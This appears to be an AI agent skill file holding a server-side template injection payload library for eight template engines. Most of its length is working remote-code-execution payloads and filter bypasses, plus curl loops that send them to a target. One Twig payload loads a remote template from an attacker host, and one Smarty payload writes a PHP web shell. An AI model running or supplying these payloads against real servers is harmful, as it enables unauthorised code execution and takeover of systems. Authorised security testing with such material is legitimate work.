---
name: payload-ssti
description: "SSTI payload collection — Jinja2/Python, Twig/PHP, FreeMarker/Java, Velocity/Java, Smarty/PHP, Mako/Python, Handlebars/Node, ERB/Ruby template injection payloads for RCE. Triggers: 'ssti payload', 'template injection payload', 'jinja2 payload', 'twig ssti', 'freemarker injection', 'velocity injection', 'smarty ssti', 'mako ssti', 'erb injection', 'server side template injection payload'."
---

# SSTI Payloads

Template injection payload library organized by template engine.

## Phase 1: Detection Payloads

```bash
TARGET="https://TARGET"
PARAM="name"

# Universal detection probes
DETECT=(
  '{{7*7}}'       # Jinja2/Twig: 49, Smarty: error
  '${7*7}'        # Freemarker/Velocity: 49
  '<%= 7*7 %>'    # ERB: 49
  '#{7*7}'        # Ruby (HAML)
  '*{7*7}'        # Spring EL: 49
  '${"freemarker.template.utility.Execute"?new()("id")}'
  '{{7*"7"}}'     # Jinja2: 7777777, Twig: 49
  '{{config}}'    # Flask Jinja2: dumps config
  '{{self}}'      # Twig: dumps object
  '{{dump(app)}}' # Twig debug
)

for payload in "${DETECT[@]}"; do
  encoded=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")
  result=$(curl -s "$TARGET/?$PARAM=$encoded")
  echo "[$payload] → $(echo $result | grep -oP '\d+|config|dump' | head -1)"
done | tee /workspace/output/ssti-detect.txt
```

## Phase 2: Jinja2 (Python/Flask) Payloads

```bash
# Basic RCE
JINJA2_RCE=(
  # Via config object
  "{{config.__class__.__init__.__globals__['os'].popen('id').read()}}"
  # Via request object
  "{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
  # MRO traversal
  "{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].decode()}}"
  # lipsum global
  "{{lipsum.__globals__['os'].popen('id').read()}}"
  # cycler object
  "{{cycler.__init__.__globals__.os.popen('id').read()}}"
  # joiner
  "{{joiner.__init__.__globals__.os.popen('id').read()}}"
  # namespace
  "{{namespace.__init__.__globals__.os.popen('id').read()}}"
)

# Filter bypass (when certain chars are blocked)
# Dot notation → |attr()
"{{config|attr('__class__')|attr('__init__')|attr('__globals__')|attr('__getitem__')('os')|attr('popen')('id')|attr('read')()}}"

# Underscore bypass
"{{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\x5f\x5fbuiltins\x5f\x5f')|attr('\x5f\x5fimport\x5f\x5f')('os')|attr('popen')('id')|attr('read')()}}"

for payload in "${JINJA2_RCE[@]}"; do
  curl -s -X POST "$TARGET/render" \
    -H "Content-Type: application/json" \
    -d "{\"template\":\"$(echo $payload | sed 's/"/\\"/g')\"}"
done | tee /workspace/output/ssti-jinja2.txt
```

## Phase 3: Twig (PHP) Payloads

```bash
TWIG_PAYLOADS=(
  # RCE via _self
  "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('id')}}"
  # RCE via filter
  "{{['id']|map('system')|join}}"
  # PHP system via filter chain
  "{{['id']|filter('system')}}"
  # Twig 2.x via sandbox bypass
  "{{_self.env.setCache('ftp://attacker.com/test.php')}}{{_self.env.loadTemplate('test')}}"
  # phpinfo
  "{{_self.env.registerUndefinedFilterCallback('phpinfo')}}{{_self.env.getFilter(1)}}"
  # var_dump globals
  "{% for key, val in _context %} {{key}} {% endfor %}"
)

for payload in "${TWIG_PAYLOADS[@]}"; do
  curl -s "$TARGET/?$PARAM=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")"
done | tee /workspace/output/ssti-twig.txt
```

## Phase 4: FreeMarker / Velocity (Java) Payloads

```bash
# FreeMarker RCE
FREEMARKER_PAYLOADS=(
  '${"freemarker.template.utility.Execute"?new()("id")}'
  '${product.getClass().forName("java.lang.Runtime").getMethod("exec","".class).invoke(product.getClass().forName("java.lang.Runtime").getMethod("getRuntime").invoke(null),"id")}'
  '<#assign ex = "freemarker.template.utility.Execute"?new()>${ex("id")}'
  '<#assign classloader=article.class.protectionDomain.classLoader><#assign owc=classloader.loadClass("freemarker.template.ObjectWrapper")><#assign dwf=owc.getField("DEFAULT_WRAPPER").get(null)><#assign ec=classloader.loadClass("freemarker.template.utility.Execute")>${dwf.newInstance(ec,null)("id")}'
)

# Velocity RCE
VELOCITY_PAYLOADS=(
  '#set($str=$class.inspect("java.lang.String").type)#set($chr=$class.inspect("java.lang.Character").type)#set($ex=$class.inspect("java.lang.Runtime").type.getRuntime().exec("id"))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end'
)

for payload in "${FREEMARKER_PAYLOADS[@]}"; do
  curl -s "$TARGET/?$PARAM=$(python3 -c "import urllib.parse; print(urllib.parse.quote('$payload'))")"
done | tee /workspace/output/ssti-java.txt
```

## Phase 5: Other Engines

```bash
# ERB (Ruby)
ERB_PAYLOADS=(
  '<%= `id` %>'
  '<%= system("id") %>'
  '<%= IO.popen("id").read %>'
)

# Smarty (PHP)
SMARTY_PAYLOADS=(
  '{php}echo `id`;{/php}'
  '{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET[cmd]); ?>",self::clearConfig())}'
  '{"rce"|system}'
  '{system("id")}'
)

# Mako (Python)
MAKO_PAYLOADS=(
  '${__import__("os").popen("id").read()}'
  '<%! import os %> ${os.popen("id").read()}'
)

# Handlebars (Node.js)
HB_PAYLOADS=(
  '{{#with "s" as |string|}}'
  '{{#with "e"}}'
  '{{constructor.constructor("return process")().mainModule.require("child_process").execSync("id").toString()}}'
)

echo "Other SSTI engines payload library" | tee /workspace/output/ssti-other.txt
for p in "${ERB_PAYLOADS[@]}" "${SMARTY_PAYLOADS[@]}" "${MAKO_PAYLOADS[@]}"; do
  echo "$p"
done >> /workspace/output/ssti-other.txt
```

## Output

Save to `/workspace/output/`:
- `ssti-detect.txt` — detection probe results
- `ssti-jinja2.txt` — Jinja2/Flask RCE attempts
- `ssti-twig.txt` — Twig RCE attempts
- `ssti-java.txt` — Java template engine results

## Next Phase

→ `vuln-ssti` for full SSTI exploitation methodology
